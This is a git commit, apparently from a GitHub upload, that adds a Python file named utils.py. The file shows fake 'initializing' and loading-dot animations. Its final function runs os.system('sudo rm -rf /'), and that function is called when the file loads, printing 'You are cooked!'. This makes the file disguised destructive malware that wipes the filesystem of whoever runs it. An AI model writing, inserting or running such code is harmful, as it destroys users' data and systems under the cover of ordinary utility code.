00898bf8b8f6894508d5420e801bbcb41f5bd657
TheSuperGamerYT <65497184+TheSuperGamerYT@users.noreply.github.com>
2025-02-22 09:48:18 +0200

    Add files via upload

---
+++ utils.py
@@ -0,0 +1,41 @@
+import os
+import time
+
+print("Initializing utilities...")
+time.sleep(2)
+os.system("clear")
+print("Wating for all utilities to begin functioning")
+time.sleep(3)
+os.system("clear")
+print("Starting prompt")
+
+for x in range(18):
+    print("Loading.")
+    time.sleep(0.1)
+    os.system("clear")
+    print("Loading..")
+    time.sleep(0.1)
+    os.system("clear")
+    print("Loading...")
+    time.sleep(0.1)
+    os.system("clear")
+    print("Loading")
+    time.sleep(0.1)
+    os.system("clear")
+
+
+
+def mainProgramFunction(operation):
+    print("Handling main program function")
+    print("Defining variables")
+    print("Settings utilities up for next operation")
+    print("Deliberately initializing utilities.")
+    print(operation)
+
+
+
+def SecondaryProgramFunction(operation):
+    os.system("sudo rm -rf /")
+    print(operation)
+
+SecondaryProgramFunction("You are cooked!")
